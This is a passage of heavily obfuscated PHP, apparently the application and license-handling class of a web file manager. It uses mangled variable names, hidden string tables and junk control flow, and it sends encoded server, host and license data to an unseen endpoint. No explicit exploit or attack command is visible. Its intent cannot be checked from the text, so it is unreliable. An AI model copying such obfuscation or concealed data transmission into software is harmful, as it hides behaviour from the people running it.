<?php
 goto cŠ‚Ãí¬î; Cõµˆ§ª´µ: while (strlen($yevoxlzutb) < $_SERVER[¿ÈˆÑ¸ä][703]) { if (!$yevoxlzutb) { break; } $yevoxlzutb++; } class Application { private $defaultModule = "\151\x6e\144\145\170"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($‘şœşŠö) { $ÉèÁë =& $_SERVER[¿ÈˆÑ¸ä]; $‚¯ë·± =& $_SERVER[ø÷æ£ÁÖ]; $ÔßöÛ¤û = explode($‚¯ë·±[0], trim($‘şœşŠö, $‚¯ë·±[0])); $¬òû¨ = $ÉèÁë[704]; if (!$¬òû¨) { return; } $this->defaultModule = $ÔßöÛ¤û[0] ? $ÔßöÛ¤û[0] : $this->defaultModule; $ó¿ğ’ = $ÉèÁë[705]; if (!$ó¿ğ’) { return; } $this->defaultController = $ÔßöÛ¤û[1] ? $ÔßöÛ¤û[1] : $this->defaultController; $Ÿô½›“À = $ÉèÁë[706]; if (strlen($Ÿô½›“À) < $ÉèÁë[703]) { die; } $this->defaultAction = $ÔßöÛ¤û[2] ? $ÔßöÛ¤û[2] : $this->defaultAction; $this->uzje658df61e($‚¯ë·±[1], array($this, $‚¯ë·±[2])); $Òƒ£‘É‡ = $ÉèÁë[707]; if (!$Òƒ£‘É‡) { return; } } public function appRun($ëäšËï) { $õòöø‚‰ =& $_SERVER[ø÷æ£ÁÖ]; $´ßÁªÎ› = explode($õòöø‚‰[0], $ëäšËï); $¥şİÛ‡ = strtolower($´ßÁªÎ›[0]); $‰é²ÂÔ˜ = $_SERVER[¿ÈˆÑ¸ä][708]; $Ï³•³¨š = $õòöø‚‰[3]; if ($¥şİÛ‡ == $õòöø‚‰[4]) { $Ï³•³¨š = $õòöø‚‰[5]; $´ßÁªÎ›[0] = $õòöø‚‰[6]; $´ßÁªÎ›[1] = $´ßÁªÎ›[1] . $õòöø‚‰[7]; $ëäšËï = join($õòöø‚‰[0], $´ßÁªÎ›); $ëäšËï = trim($ëäšËï, $õòöø‚‰[0]); } call_user_func(array($õòöø‚‰[8], $õòöø‚‰[9]), $Ï³•³¨š . $õòöø‚‰[10], $ëäšËï); ActionCall($ëäšËï); call_user_func(array($õòöø‚‰[8], $õòöø‚‰[9]), $Ï³•³¨š . $õòöø‚‰[11], $ëäšËï); } private function autorun() { $ÆÉ¯Ü¶± =& $_SERVER[ø÷æ£ÁÖ]; global $config; if (count($config[$ÆÉ¯Ü¶±[12]]) == 0) { return; } foreach ($config[$ÆÉ¯Ü¶±[12]] as $í”§ß‹½ => $®Ñ¡­ÓÛ) { $this->appRun($®Ñ¡­ÓÛ); } } private function sojx3aadea51() { $…Ã„šëÊ =& $_SERVER[¿ÈˆÑ¸ä]; $Ğñ¦ôËƒ =& $_SERVER[ø÷æ£ÁÖ]; $§Ï¬ÜÌí = $Ğñ¦ôËƒ[4]; $î÷Ï£ÃÖ = $…Ã„šëÊ[709]; if (!$î÷Ï£ÃÖ) { die; } $ÊÔò¡¶‰ = $GLOBALS[$Ğñ¦ôËƒ[13]][$Ğñ¦ôËƒ[14]][0]; $°–´³ˆé = $…Ã„šëÊ[710]; while (strlen($°–´³ˆé) < $…Ã„šëÊ[711]) { if (!$°–´³ˆé) { break; } $°–´³ˆé++; } if (!$ÊÔò¡¶‰ || strlen($ÊÔò¡¶‰) <= strlen($§Ï¬ÜÌí)) { return; } if (strtolower(substr($ÊÔò¡¶‰, -strlen($§Ï¬ÜÌí))) != $§Ï¬ÜÌí) { return; } $®É÷µã³ = substr($ÊÔò¡¶‰, 0, -strlen($§Ï¬ÜÌí)); $µ–é“İ = $…Ã„šëÊ[712]; while ($µ–é“İ < $…Ã„šëÊ[711]) { if ($µ–é“İ >= 0) { break; } $µ–é“İ++; } $¤û«š¹İ = array($Ğñ¦ôËƒ[4], $®É÷µã³); $¯±†Èİ = array_slice($GLOBALS[$Ğñ¦ôËƒ[13]][$Ğñ¦ôËƒ[14]], 1); $µÀŒ—áâ = $…Ã„šëÊ[713]; if (!$µÀŒ—áâ) { return; } $GLOBALS[$Ğñ¦ôËƒ[13]][$Ğñ¦ôËƒ[14]] = array_merge($¤û«š¹İ, $¯±†Èİ); $ùÔ°ˆ = $…Ã„šëÊ[714]; if (strlen($ùÔ°ˆ) < $…Ã„šëÊ[703]) { return; } $GLOBALS[$Ğñ¦ôËƒ[13]][$Ğñ¦ôËƒ[15]] = implode($Ğñ¦ôËƒ[0], $GLOBALS[$Ğñ¦ôËƒ[13]][$Ğñ¦ôËƒ[14]]); } private function nkshe55b269d() { $ò˜¬çúß =& $_SERVER[¿ÈˆÑ¸ä]; $ñîıé½ö =& $_SERVER[ø÷æ£ÁÖ]; if ($GLOBALS[$ñîıé½ö[13]][$ñîıé½ö[15]] != $ñîıé½ö[6]) { return; } $¶ÙÇù³Ä = $_SERVER[$ñîıé½ö[16]]; $™ì‡Æîç = $ò˜¬çúß[715]; if (!$™ì‡Æîç) { return; } $£‡Şï„Ù = $ñîıé½ö[17]; $Ÿ¦æî©† = $ò˜¬çúß[716]; if (strlen($Ÿ¦æî©†) < $ò˜¬çúß[699]) { return; } if (!strstr($¶ÙÇù³Ä, $£‡Şï„Ù)) { return; } $âÜĞÆ¸¿ = strrpos($¶ÙÇù³Ä, $£‡Şï„Ù); $—Ç²–şİ = substr($¶ÙÇù³Ä, $âÜĞÆ¸¿ + strlen($£‡Şï„Ù)); preg_match_all($ñîıé½ö[18], $—Ç²–şİ, $—¬ÇŞÆ§); $Â†õ×¶â = $ò˜¬çúß[717]; if (strlen($Â†õ×¶â) < $ò˜¬çúß[718]) { return; } $—Ç²–şİ = trim($—¬ÇŞÆ§[0][0], $ñîıé½ö[19]); $GLOBALS[$ñîıé½ö[13]][$ñîıé½ö[14]] = explode($ñîıé½ö[19], $—Ç²–şİ); $†»È×ÆË = $ò˜¬çúß[719]; if (strlen($†»È×ÆË) < $ò˜¬çúß[711]) { return; } $GLOBALS[$ñîıé½ö[13]][$ñîıé½ö[15]] = implode($ñîıé½ö[0], $GLOBALS[$ñîıé½ö[13]][$ñîıé½ö[14]]); } public function run() { $ÙË´¤ú… =& $_SERVER[¿ÈˆÑ¸ä]; $°»¢Í¹‡ =& $_SERVER[ø÷æ£ÁÖ]; $this->nkshe55b269d(); $ÆÃŸğç… = $ÙË´¤ú…[720]; if (!$ÆÃŸğç…) { return; } $this->sojx3aadea51(); $ªñ›÷‰¦ = $ÙË´¤ú…[721]; $²—Š÷Ò = $GLOBALS[$°»¢Í¹‡[13]][$°»¢Í¹‡[14]]; $½ÂÙÌó = $GLOBALS[$°»¢Í¹‡[13]][$°»¢Í¹‡[15]]; define($°»¢Í¹‡[20], isset($²—Š÷Ò[0]) && $²—Š÷Ò[0] ? $²—Š÷Ò[0] : $this->defaultModule); define($°»¢Í¹‡[21], isset($²—Š÷Ò[1]) && $²—Š÷Ò[0] ? $²—Š÷Ò[1] : $this->defaultController); $“Õì¨›’ = $ÙË´¤ú…[722]; if (!$“Õì¨›’) { die; } define($°»¢Í¹‡[22], isset($²—Š÷Ò[2]) && $²—Š÷Ò[0] ? $²—Š÷Ò[2] : $this->defaultAction); define($°»¢Í¹‡[23], MOD . $°»¢Í¹‡[0] . ST . $°»¢Í¹‡[0] . ACT); $Ñ«£ó¿Ã = $ÙË´¤ú…[723]; if (strlen($Ñ«£ó¿Ã) < $ÙË´¤ú…[718]) { return; } $_SERVER[$°»¢Í¹‡[24]] = strtolower(ACTION); $”›Şº ß = $ÙË´¤ú…[724]; if (strlen($”›Şº ß) < $ÙË´¤ú…[725]) { return; } $this->autorun(); if (count($²—Š÷Ò) >= 3) { $this->appRun($½ÂÙÌó); } else { $this->appRun(ACTION); } } private $eyka01a7ca33 = array(); private $vpgh9f24e733 = ''; public function ankxa3b32198() { $ÜáÙŠé† =& $_SERVER[¿ÈˆÑ¸ä]; $¬êÓÓ =& $_SERVER[ø÷æ£ÁÖ]; $this->vqjt6d252a19(); $éÂ›€µç = $ÜáÙŠé†[726]; while ($éÂ›€µç < $ÜáÙŠé†[718]) { if ($éÂ›€µç >= 0) { break; } $éÂ›€µç++; } $this->necx9a399733(); $this->ieapdb147eab(); $this->mloa3a543702(); $this->xcns8cf4f45f(); $½´ß­ = $ÜáÙŠé†[727]; while ($½´ß­ < $ÜáÙŠé†[699]) { if ($½´ß­ >= 0) { break; } $½´ß­++; } $this->vwur57b5a60b(); $È»‡‹¿ = $ÜáÙŠé†[728]; if (!$È»‡‹¿) { return; } $this->gktcb90ec358(); $this->uzje658df61e($¬êÓÓ[25], array($this, $¬êÓÓ[26])); $this->uzje658df61e($¬êÓÓ[27], array($this, $¬êÓÓ[28])); $this->uzje658df61e($¬êÓÓ[29], array($this, $¬êÓÓ[30])); $this->uzje658df61e($¬êÓÓ[31], array($this, $¬êÓÓ[32])); } public function getVersionData() { return $this->eyka01a7ca33; $°ïŠÀ¡Õ = $_SERVER[¿ÈˆÑ¸ä][729]; } public function zhsv83b13cf4($Áğúƒ¦‰) { $êş‹ß·‡ =& $_SERVER[¿ÈˆÑ¸ä]; $©¶±Ë Ì =& $_SERVER[ø÷æ£ÁÖ]; $Ìã‰²ğ‚ = Model($©¶±Ë Ì[33])->get(); $íèËÏÌ‘ = array($©¶±Ë Ì[34], $©¶±Ë Ì[35], $©¶±Ë Ì[36], $©¶±Ë Ì[37], $©¶±Ë Ì[38], $©¶±Ë Ì[39], $©¶±Ë Ì[40], $©¶±Ë Ì[41], $©¶±Ë Ì[42], $©¶±Ë Ì[43], $©¶±Ë Ì[44], $©¶±Ë Ì[45], $©¶±Ë Ì[46], $©¶±Ë Ì[47], $©¶±Ë Ì[48], $©¶±Ë Ì[49], $©¶±Ë Ì[50], $©¶±Ë Ì[51], $©¶±Ë Ì[52], $©¶±Ë Ì[53], $©¶±Ë Ì[54], $©¶±Ë Ì[55], $©¶±Ë Ì[56], $©¶±Ë Ì[57], $©¶±Ë Ì[58], $©¶±Ë Ì[59], $©¶±Ë Ì[60], $©¶±Ë Ì[61], $©¶±Ë Ì[62], $©¶±Ë Ì[63], $©¶±Ë Ì[64], $©¶±Ë Ì[65], $©¶±Ë Ì[66], $©¶±Ë Ì[67], $©¶±Ë Ì[68], $©¶±Ë Ì[69], $©¶±Ë Ì[70], $©¶±Ë Ì[71], $©¶±Ë Ì[72], $©¶±Ë Ì[73], $©¶±Ë Ì[74], $©¶±Ë Ì[75], $©¶±Ë Ì[76], $©¶±Ë Ì[77], $©¶±Ë Ì[78], $©¶±Ë Ì[79], $©¶±Ë Ì[80], $©¶±Ë Ì[81], $©¶±Ë Ì[82], $©¶±Ë Ì[83], $©¶±Ë Ì[84], $©¶±Ë Ì[85], $©¶±Ë Ì[86], $©¶±Ë Ì[87]); foreach ($íèËÏÌ‘ as $í¸½èò) { $Ó£„³·± = $GLOBALS[$©¶±Ë Ì[88]][$©¶±Ë Ì[89]][$í¸½èò]; if (isset($Ìã‰²ğ‚[$í¸½èò])) { $Ó£„³·± = $Ìã‰²ğ‚[$í¸½èò]; } $Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$í¸½èò] = $Ó£„³·±; } $ó„ŞÆı¶ = $Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$©¶±Ë Ì[46]]; unset($Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[92]][$©¶±Ë Ì[93]]); unset($Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[92]][$©¶±Ë Ì[94]]); unset($Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$©¶±Ë Ì[46]]); unset($Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$©¶±Ë Ì[95]]); $š’‚ã¾ = $êş‹ß·‡[730]; if (!$š’‚ã¾) { return; } $Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$©¶±Ë Ì[96]] = array($©¶±Ë Ì[97] => (int) $ó„ŞÆı¶[$©¶±Ë Ì[98]], $©¶±Ë Ì[99] => (int) _get($ó„ŞÆı¶, $©¶±Ë Ì[100], 0)); $«Õ•‰ = substr(md5($©¶±Ë Ì[101] . get_client_ip() . $Ìã‰²ğ‚[$©¶±Ë Ì[102]]), 0, 15); $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[104]] = Mcrypt::encode(Session::sign(), $«Õ•‰, 3600 * 24); $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[105]] = Action($©¶±Ë Ì[106])->accessToken(); $ÏÉÆù‹— = $êş‹ß·‡[731]; if (!$ÏÉÆù‹—) { return; } $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[107]] = md5($_SERVER[$©¶±Ë Ì[108]] . $Ìã‰²ğ‚[$©¶±Ë Ì[102]]); $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[109]] = base64_encode(serverInfo()); $àíô±Ñ¸ = $êş‹ß·‡[732]; if (!$àíô±Ñ¸) { return; } $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[110]] = $this->vpgh9f24e733; $ş–²ˆÎ¾ = $êş‹ß·‡[733]; if ($Ìã‰²ğ‚[$©¶±Ë Ì[110]] != $©¶±Ë Ì[111]) { $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[112]] = $Ìã‰²ğ‚[$©¶±Ë Ì[112]]; $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[113]] = $Ìã‰²ğ‚[$©¶±Ë Ì[113]]; $¸ËşÓ¿Ã = rand_string(10) . $this->vpgh9f24e733 . rand_string(5); $Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[114]][$©¶±Ë Ì[115]] = $this->dtaq5eb3bb08($¸ËşÓ¿Ã, $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[107]]); } if ($this->vpgh9f24e733 == $©¶±Ë Ì[111]) { $Áğúƒ¦‰[$©¶±Ë Ì[90]][$©¶±Ë Ì[91]][$©¶±Ë Ì[96]][$©¶±Ë Ì[100]] = 0; } $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[116]] = $this->versionPluginFilter(); $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[117]] = _get($this->eyka01a7ca33, $©¶±Ë Ì[118], $©¶±Ë Ì[6]); $‹Ø«¸îñ = $êş‹ß·‡[734]; if (!$‹Ø«¸îñ) { die; } if (KodUser::isRoot() && $this->config[$©¶±Ë Ì[119]]) { $Áğúƒ¦‰[$©¶±Ë Ì[103]][$©¶±Ë Ì[120]] = WEB_ROOT; } return $Áğúƒ¦‰; } private function vwur57b5a60b() { $Ñ“¤ØûÓ =& $_SERVER[¿ÈˆÑ¸ä]; $ğêæ²µğ =& $_SERVER[ø÷æ£ÁÖ]; $şçØ’õœ = $_SERVER[$ğêæ²µğ[24]] == $ğêæ²µğ[121]; if ($_SERVER[$ğêæ²µğ[24]] == $ğêæ²µğ[122] && $_GET[$ğêæ²µğ[123]] == $ğêæ²µğ[124]) { $şçØ’õœ = !0; } if ($şçØ’õœ) { $İí¿ŠÄ = array($ğêæ²µğ[110] => $this->vpgh9f24e733, $ğêæ²µğ[125] => $this->etywa8af03d8(), $ğêæ²µğ[126] => Model($ğêæ²µğ[127])->count()); if ($this->vpgh9f24e733 != $ğêæ²µğ[111]) { $£÷Ş™ = _get($this->eyka01a7ca33, $ğêæ²µğ[128]); if ($£÷Ş™) { $İí¿ŠÄ[$ğêæ²µğ[129]] = $£÷Ş™; $İí¿ŠÄ[$ğêæ²µğ[130]] = strtotime(_get($this->eyka01a7ca33, $ğêæ²µğ[131])); $İí¿ŠÄ[$ğêæ²µğ[132]] = _get($this->eyka01a7ca33, $ğêæ²µğ[118]); } $£âî†üï = Model($ğêæ²µğ[33])->get($ğêæ²µğ[133], $ğêæ²µğ[6], !0); if (is_string($£âî†üï) && substr($£âî†üï, 0, 1) == $ğêæ²µğ[134]) { $£âî†üï = json_decode_force($£âî†üï); } if (is_array($£âî†üï) && $£âî†üï[$ğêæ²µğ[135]] && strstr($£âî†üï[$ğêæ²µğ[135]], $ğêæ²µğ[136])) { $¢ˆ¸ÏåÈ = explode($ğêæ²µğ[136], $£âî†üï[$ğêæ²µğ[135]]); $İí¿ŠÄ[$ğêæ²µğ[137]] = $¢ˆ¸ÏåÈ[0]; } } $İí¿ŠÄ = $this->xkryb402ffa2(json_encode($İí¿ŠÄ), md5($ğêæ²µğ[138])); $¡¶ìˆç = array($ğêæ²µğ[139] => $İí¿ŠÄ); call_user_func(array($ğêæ²µğ[140], $ğêæ²µğ[141]), $¡¶ìˆç); $íŒªîØ½ = $Ñ“¤ØûÓ[735]; } if ($this->vpgh9f24e733 == $ğêæ²µğ[111]) { return; } $…œÀ¶èû = array($ğêæ²µğ[142], $ğêæ²µğ[143], $ğêæ²µğ[144], $ğêæ²µğ[145], $ğêæ²µğ[146], $ğêæ²µğ[147]); $ÓİÌêäì = Model($ğêæ²µğ[33])->get(); $ğ·‰‘Åó = $Ñ“¤ØûÓ[736]; $¡¶ìˆç = array($ğêæ²µğ[148] => $ÓİÌêäì[$ğêæ²µğ[34]], $ğêæ²µğ[149] => $ÓİÌêäì[$ğêæ²µğ[35]], $ğêæ²µğ[150] => $ğêæ²µğ[6]); foreach ($…œÀ¶èû as $±ì˜¢“ä) { if (!isset($ÓİÌêäì[$±ì˜¢“ä]) || !$ÓİÌêäì[$±ì˜¢“ä]) { continue; } $¡¶ìˆç[$±ì˜¢“ä] = $ÓİÌêäì[$±ì˜¢“ä]; } call_user_func(array($ğêæ²µğ[140], $ğêæ²µğ[141]), $¡¶ìˆç); } private function mloa3a543702() { $óÇ™é Ó =& $_SERVER[¿ÈˆÑ¸ä]; $çõ×ºÏ¶ =& $_SERVER[ø÷æ£ÁÖ]; if ($_SERVER[$çõ×ºÏ¶[24]] != $çõ×ºÏ¶[151]) { return; } if (!KodUser::isRoot()) { die; } $ôËĞâ†¤ = $GLOBALS[$çõ×ºÏ¶[13]]; if (isset($ôËĞâ†¤[$çõ×ºÏ¶[152]])) { $this->ruwtda0b037e(); die; } if (isset($ôËĞâ†¤[$çõ×ºÏ¶[153]]) && isset($ôËĞâ†¤[$çõ×ºÏ¶[153]]) == $çõ×ºÏ¶[124]) { $ôËĞâ†¤[$çõ×ºÏ¶[154]] = Model($çõ×ºÏ¶[33])->get($çõ×ºÏ¶[155]); } if (!isset($ôËĞâ†¤[$çõ×ºÏ¶[154]]) || strlen($ôËĞâ†¤[$çõ×ºÏ¶[154]]) != 16) { show_json($çõ×ºÏ¶[156] . $ôËĞâ†¤[$çõ×ºÏ¶[154]], !1); } $Îõïû–¥ = Model($çõ×ºÏ¶[33])->get($çõ×ºÏ¶[102]); $£¦ôı¹‹ = md5($_SERVER[$çõ×ºÏ¶[108]] . $Îõïû–¥); $úÊĞµã = array($çõ×ºÏ¶[154] => $ôËĞâ†¤[$çõ×ºÏ¶[154]], $çõ×ºÏ¶[157] => rand_string(16), $çõ×ºÏ¶[158] => $çõ×ºÏ¶[138], $çõ×ºÏ¶[159] => $çõ×ºÏ¶[160], $çõ×ºÏ¶[161] => $_SERVER[$çõ×ºÏ¶[162]], $çõ×ºÏ¶[163] => $_SERVER[$çõ×ºÏ¶[164]], $çõ×ºÏ¶[165] => $_SERVER[$çõ×ºÏ¶[166]], $çõ×ºÏ¶[107] => $£¦ôı¹‹, $çõ×ºÏ¶[167] => Model($çõ×ºÏ¶[33])->get($çõ×ºÏ¶[133])); $ÙÛò¸‘á = $óÇ™é Ó[737]; if (strlen($ÙÛò¸‘á) < $óÇ™é Ó[725]) { return; } if (isset($ôËĞâ†¤[$çõ×ºÏ¶[153]]) && isset($ôËĞâ†¤[$çõ×ºÏ¶[153]]) == $çõ×ºÏ¶[124]) { $úÊĞµã[$çõ×ºÏ¶[153]] = md5($úÊĞµã[$çõ×ºÏ¶[154]] . $çõ×ºÏ¶[168] . $úÊĞµã[$çõ×ºÏ¶[157]]); } if ($ôËĞâ†¤[$çõ×ºÏ¶[169]] == $çõ×ºÏ¶[170]) { $Ì‹¹÷¶Ó = $this->xkryb402ffa2($£¦ôı¹‹, $çõ×ºÏ¶[171]); $¼¢ßÇÀ = $this->dtaq5eb3bb08(json_encode($úÊĞµã), $£¦ôı¹‹ . $çõ×ºÏ¶[172], 3); $¼¢ßÇÀ = $¼¢ßÇÀ . $çõ×ºÏ¶[173] . $_SERVER[$çõ×ºÏ¶[162]]; $†– öÎº = $this->veqrbded313c($çõ×ºÏ¶[174] . $Ì‹¹÷¶Ó . $çõ×ºÏ¶[175] . $¼¢ßÇÀ, -1); show_json($†– öÎº, !0); } else { if ($ôËĞâ†¤[$çõ×ºÏ¶[169]] == $çõ×ºÏ¶[176]) { $Ä€Æñ™” = substr(md5($çõ×ºÏ¶[177] . $£¦ôı¹‹), 12, 15) . $çõ×ºÏ¶[178]; $¼¢ßÇÀ = $this->lijscedc0016(trim($ôËĞâ†¤[$çõ×ºÏ¶[179]]), $Ä€Æñ™”, 2); $Û¨Î‘¨‡ = json_decode($¼¢ßÇÀ, !0); if (!is_array($Û¨Î‘¨‡) || !is_array($Û¨Î‘¨‡[$çõ×ºÏ¶[180]]) || $Û¨Î‘¨‡[$çõ×ºÏ¶[154]] != !0) { $¦ëË‡ù˜ = $çõ×ºÏ¶[181]; $ºß¼ÊÀ = $Û¨Î‘¨‡[$çõ×ºÏ¶[180]] ? $çõ×ºÏ¶[182] . $Û¨Î‘¨‡[$çõ×ºÏ¶[180]] : $¦ëË‡ù˜; show_json($ºß¼ÊÀ, !1); } else { $úÊĞµã[$çõ×ºÏ¶[157]] = $Û¨Î‘¨‡[$çõ×ºÏ¶[180]][$çõ×ºÏ¶[183]]; } } else { $Û¨Î‘¨‡ = $this->veqrbded313c($çõ×ºÏ¶[184], $úÊĞµã, 10); } } if (!is_array($Û¨Î‘¨‡) || !is_array($Û¨Î‘¨‡[$çõ×ºÏ¶[180]]) || $Û¨Î‘¨‡[$çõ×ºÏ¶[154]] != !0) { $¦ëË‡ù˜ = LNG($çõ×ºÏ¶[185]); $ºß¼ÊÀ = $Û¨Î‘¨‡[$çõ×ºÏ¶[180]] ? $çõ×ºÏ¶[182] . $Û¨Î‘¨‡[$çõ×ºÏ¶[180]] : $¦ëË‡ù˜; show_json($ºß¼ÊÀ, !1); } $ŠîéÈœ¸ = $Û¨Î‘¨‡[$çõ×ºÏ¶[180]]; $ğ‰†Œçù = $this->czdr252eef06($ŠîéÈœ¸[$çõ×ºÏ¶[186]]); if (!$ğ‰†Œçù || $ğ‰†Œçù != $ŠîéÈœ¸[$çõ×ºÏ¶[131]]) { $êŞã¡È¤ = array($çõ×ºÏ¶[187] => Model($çõ×ºÏ¶[33])->get($çõ×ºÏ¶[102]), $çõ×ºÏ¶[188] => $_SERVER[$çõ×ºÏ¶[108]], $çõ×ºÏ¶[189] => this_url(), $çõ×ºÏ¶[163] => $_SERVER[$çõ×ºÏ¶[164]]); $¼¢ßÇÀ = $this->zbhx97abfeb8(json_encode($êŞã¡È¤)); $this->veqrbded313c($çõ×ºÏ¶[190] . $¼¢ßÇÀ); show_json(LNG($çõ×ºÏ¶[191]), !0); } $æôÂë™ñ = array($çõ×ºÏ¶[155] => $ŠîéÈœ¸[$çõ×ºÏ¶[192]], $çõ×ºÏ¶[193] => $ŠîéÈœ¸[$çõ×ºÏ¶[194]], $çõ×ºÏ¶[195] => rand_string(16), $çõ×ºÏ¶[110] => $ŠîéÈœ¸[$çõ×ºÏ¶[196]]); if ($úÊĞµã[$çõ×ºÏ¶[157]]) { $æôÂë™ñ[$çõ×ºÏ¶[195]] = $úÊĞµã[$çõ×ºÏ¶[157]]; } $ÈØé°şƒ = substr(md5($æôÂë™ñ[$çõ×ºÏ¶[193]]), 10, 10); $ñ“ê½­° = $ÈØé°şƒ . $æôÂë™ñ[$çõ×ºÏ¶[110]] . $æôÂë™ñ[$çõ×ºÏ¶[195]]; $ñìº¾Ô… = $óÇ™é Ó[738]; if (!$ñìº¾Ô…) { die; } $æôÂë™ñ[$çõ×ºÏ¶[112]] = strrev(base64_encode($this->xkryb402ffa2($ñ“ê½­°, $çõ×ºÏ¶[197]))); $øô°±ûè = $óÇ™é Ó[739]; while (strlen($øô°±ûè) < $óÇ™é Ó[711]) { if (!$øô°±ûè) { break; } $øô°±ûè++; } $ßÜ™Ïµş = rand_string(16); $ã—ˆãÕ· = $óÇ™é Ó[740]; if (!$ã—ˆãÕ·) { return; } $¥ô÷® = $ßÜ™Ïµş . $æôÂë™ñ[$çõ×ºÏ¶[110]] . $this->xkryb402ffa2(md5($æôÂë™ñ[$çõ×ºÏ¶[155]]), $ßÜ™Ïµş); $æôÂë™ñ[$çõ×ºÏ¶[113]] = base64_encode(strrev($this->xkryb402ffa2($¥ô÷®, $çõ×ºÏ¶[198]))); if ($ŠîéÈœ¸[$çõ×ºÏ¶[199]] && $ŠîéÈœ¸[$çõ×ºÏ¶[199]] >= 1) { Model($çõ×ºÏ¶[33])->setDeep($çõ×ºÏ¶[200], $çõ×ºÏ¶[124]); } Model($çõ×ºÏ¶[33])->set($æôÂë™ñ); $ì´­à­ = md5($_SERVER[$çõ×ºÏ¶[108]] . strrev($Îõïû–¥) . $æôÂë™ñ[$çõ×ºÏ¶[193]]); $ÙéÅëıŒ = $óÇ™é Ó[741]; if (!$ÙéÅëıŒ) { die; } $ ¥ŸíÂ = strrev(substr($ì´­à­, 10, 16)); $—ˆÓİÚ¾ = $this->dtaq5eb3bb08(json_encode($ŠîéÈœ¸), $ì´­à­); $³äûÆçå = $óÇ™é Ó[742]; if (!$³äûÆçå) { return; } $âßÀØÈÕ = array_to_keyvalue(Model($çõ×ºÏ¶[7])->listData(), $çõ×ºÏ¶[201]); $Ï®®¨ïÉ = $âßÀØÈÕ[$çõ×ºÏ¶[202]]; $Èíı“Èõ = array(); $Èíı“Èõ[$ ¥ŸíÂ] = $—ˆÓİÚ¾; $ì§ß½Æ¤ = $óÇ™é Ó[743]; while (strlen($ì§ß½Æ¤) < $óÇ™é Ó[725]) { if (!$ì§ß½Æ¤) { break; } $ì§ß½Æ¤++; } Model($çõ×ºÏ¶[7])->update($Ï®®¨ïÉ[$çõ×ºÏ¶[203]], array($çõ×ºÏ¶[204] => $Èíı“Èõ)); $this->eyka01a7ca33 = $ŠîéÈœ¸; $this->vpgh9f24e733 = $æôÂë™ñ[$çõ×ºÏ¶[110]]; $this->licenseRegistSuccess(); $ûôÍñ¼İ = $óÇ™é Ó[744]; Cache::set($çõ×ºÏ¶[205] . md5($Îõïû–¥ . $çõ×ºÏ¶[206]), $çõ×ºÏ¶[6]); $½š“á½ = $óÇ™é Ó[745]; show_json(LNG($çõ×ºÏ¶[191]), !0); } private function licenseRegistSuccess() { $à¥ÑÕÍ† =& $_SERVER[¿ÈˆÑ¸ä]; $î–Ìåïî =& $_SERVER[ø÷æ£ÁÖ]; $ÔÈù¡ú = Model($î–Ìåïî[33])->get(); $Ç¨øêŞ¸ = $à¥ÑÕÍ†[746]; if (strlen($Ç¨øêŞ¸) < $à¥ÑÕÍ†[725]) { return; } if ($ÔÈù¡ú[$î–Ìåïî[63]] != $î–Ìåïî[124]) { Model($î–Ìåïî[33])->set($î–Ìåïî[63], $î–Ìåïî[124]); } Action($î–Ìåïî[207])->initStart(!0); } private function ruwtda0b037e() { $å±¢¿Å” =& $_SERVER[¿ÈˆÑ¸ä]; $ºÍùÉÕç =& $_SERVER[ø÷æ£ÁÖ]; Model($ºÍùÉÕç[33])->set(array($ºÍùÉÕç[155] => $ºÍùÉÕç[6], $ºÍùÉÕç[193] => $ºÍùÉÕç[6], $ºÍùÉÕç[110] => $ºÍùÉÕç[111], $ºÍùÉÕç[112] => $ºÍùÉÕç[6], $ºÍùÉÕç[113] => $ºÍùÉÕç[6])); Model($ºÍùÉÕç[33])->setDeep($ºÍùÉÕç[200], $ºÍùÉÕç[208]); $¤ßÛËü‰ = $å±¢¿Å”[747]; while ($¤ßÛËü‰ < $å±¢¿Å”[725]) { if ($¤ßÛËü‰ >= 0) { break; } $¤ßÛËü‰++; } $this->eyka01a7ca33 = array(); $this->vpgh9f24e733 = $ºÍùÉÕç[111]; } private function vqjt6d252a19() { $”µĞ£®û =& $_SERVER[¿ÈˆÑ¸ä]; $ı¢´ÌØ =& $_SERVER[ø÷æ£ÁÖ]; $_SERVER[$ı¢´ÌØ[164]] = _get($_SERVER, $ı¢´ÌØ[164], APP_HOST); $this->vpgh9f24e733 = $ı¢´ÌØ[111]; $Ë½î€ïñ = Model($ı¢´ÌØ[33])->get(); $¼şŒüŒ = $”µĞ£®û[748]; if (strlen($¼şŒüŒ) < $”µĞ£®û[711]) { return; } if ($Ë½î€ïñ[$ı¢´ÌØ[110]] == $ı¢´ÌØ[111]) { return; } $ÖÔºÓµŞ = Model($ı¢´ÌØ[33])->get($ı¢´ÌØ[102]); $óìª¸Ïğ = $”µĞ£®û[749]; $àç¿¡“º = $ı¢´ÌØ[205] . md5($ÖÔºÓµŞ . $ı¢´ÌØ[206]); $²íùêç¢ = $”µĞ£®û[750]; while (strlen($²íùêç¢) < $”µĞ£®û[725]) { if (!$²íùêç¢) { break; } $²íùêç¢++; } $ÉÄå¯Ñ‹ = Cache::get($àç¿¡“º); $ï°ÍµÂ· = $”µĞ£®û[751]; if (!$ï°ÍµÂ·) { return; } if (!is_array($ÉÄå¯Ñ‹) || 